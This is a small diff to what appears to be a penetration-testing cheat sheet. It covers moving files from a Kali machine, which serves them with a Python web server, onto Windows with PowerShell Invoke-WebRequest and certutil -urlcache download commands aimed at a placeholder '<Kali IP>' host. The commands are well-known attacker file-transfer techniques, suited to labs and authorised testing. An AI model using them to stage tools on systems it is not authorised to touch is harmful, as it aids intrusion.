@@ -30,14 +30,14 @@ sudo python3 -m http.server 80
 
 ### download to Windows
 
-Powershell
+PowerShell
 ```
 Invoke-WebRequest -Uri 'http://<Kali IP>/<filename>' -OutFile <filename> 
 ```
 
 Certutil
 ```
-certutil -urlcache -f 'http://<Kali IP>/<filename>' <path_destiny><filename>
+certutil -urlcache -split -f 'http://<Kali IP>/<filename>' <path_destiny><filename>
 ```
 
 
